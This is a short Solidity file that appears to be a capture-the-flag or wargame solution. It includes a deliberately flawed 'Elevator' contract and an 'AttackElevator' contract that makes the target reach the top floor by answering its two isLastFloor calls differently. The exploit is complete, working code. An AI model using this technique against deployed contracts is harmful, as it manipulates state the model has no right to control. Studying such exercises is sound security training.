// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract AttackElevator {
    Elevator public immutable target;
    uint numberOfCalls = 0; 

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() public {
        target.goTo(1);
        require(target.top(), "Not top floor");
    }

    function isLastFloor(uint) public returns (bool) {
        if (numberOfCalls == 0) {
            numberOfCalls++;
            return false;
        } else {
            return true;
        }
    }
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}